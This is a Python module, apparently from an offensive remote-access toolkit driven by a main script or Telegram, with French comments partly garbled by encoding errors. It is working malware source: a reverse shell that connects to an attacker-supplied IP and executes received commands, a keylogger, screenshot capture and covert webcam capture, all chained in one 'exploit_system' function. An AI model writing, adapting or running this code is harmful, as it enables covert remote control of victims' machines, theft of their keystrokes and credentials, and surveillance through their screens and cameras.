# modules/exploit_sys.py

import os
import sys
import socket
import subprocess
import time
from datetime import datetime
from pathlib import Path

# üì¶ Import racine du projet
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, ".."))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# üîê Configuration globale (LPORT uniquement ‚Äî LHOST viendra d‚Äôargs)
try:
    from core.config import LPORT
except Exception:
    LPORT = 4444  # Valeur par d√©faut

# üìÅ R√©pertoires
BASE_DIR = Path(project_root)
OUTPUT_DIR = BASE_DIR / "outputs"
KEYLOG_PATH = OUTPUT_DIR / "keylogs" / "keylog.txt"
SCREENSHOT_PATH = OUTPUT_DIR / "screenshots" / f"screenshot_{datetime.now():%Y%m%d_%H%M%S}.png"
WEBCAM_PATH = OUTPUT_DIR / "screenshots" / f"webcam_{datetime.now():%Y%m%d_%H%M%S}.jpg"
ERROR_LOG_PATH = OUTPUT_DIR / "logs" / "error_log.txt"

# üìÇ Cr√©ation des dossiers n√©cessaires
for path in [KEYLOG_PATH.parent, SCREENSHOT_PATH.parent, ERROR_LOG_PATH.parent]:
    os.makedirs(path, exist_ok=True)

# üîÑ Import silencieux des modules facultatifs
try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import cv2
except ImportError:
    cv2 = None

# üß† Journalisation d'erreurs
def log_error(message):
    try:
        with open(ERROR_LOG_PATH, "a", encoding="utf-8") as f:
            ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            f.write(f"{ts}{message}\n")
    except:
        pass

# üêö Reverse shell
def reverse_shell(ip=None, port=None):
    if not ip:
        log_error("‚ùå IP attaquante non fournie. Utilisez --lhost ou run(ip=...).")
        return

    port = port or LPORT

    if ip.startswith("127.") or ip == "localhost":
        log_error(f"‚ùå Reverse shell ignor√© - IP de loopback d√©tect√©e ({ip})")
        return

    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send("[+] Connexion √©tablie\n".encode("utf-8"))
        while True:
            cmd = s.recv(1024).decode("utf-8").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if cmd:
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(str(e).encode("utf-8"))
        s.close()
    except Exception as e:
        log_error(f"Reverse shell failed: {e}")

# ‚å®Ô∏è Keylogger
def start_keylogger(duration_sec=60):
    try:
        from pynput.keyboard import Listener

        def on_press(key):
            try:
                with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
                    ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                    char = getattr(key, 'char', None)
                    f.write(f"{ts}{char or str(key)}\n")
            except Exception:
                pass

        listener = Listener(on_press=on_press)
        listener.start()
        time.sleep(duration_sec)
        listener.stop()
    except Exception as e:
        log_error(f"Keylogger error: {e}")

# üì∏ Screenshot
def take_screenshot():
    try:
        if pyautogui:
            pyautogui.screenshot(SCREENSHOT_PATH)
    except Exception as e:
        log_error(f"Screenshot error: {e}")

# üé• Webcam
def capture_webcam():
    try:
        if cv2:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                raise RuntimeError("Webcam non disponible")
            ret, frame = cam.read()
            cam.release()
            if ret:
                cv2.imwrite(str(WEBCAM_PATH), frame)
    except Exception as e:
        log_error(f"Webcam capture error: {e}")

# üéØ Exploitation compl√®te
def exploit_system(target_ip=None):
    reverse_shell(ip=target_ip)
    take_screenshot()
    capture_webcam()
    start_keylogger(60)

# ‚úÖ Entr√©e compatible main.py / Telegram
def run(ip=None):
    exploit_system(target_ip=ip)

# üö´ S√©curit√© : pas d‚Äôex√©cution locale directe
if __name__ == "__main__":
    print("‚ö†Ô∏è Ce module est con√ßu pour √™tre appel√© via main.py ou Telegram.")
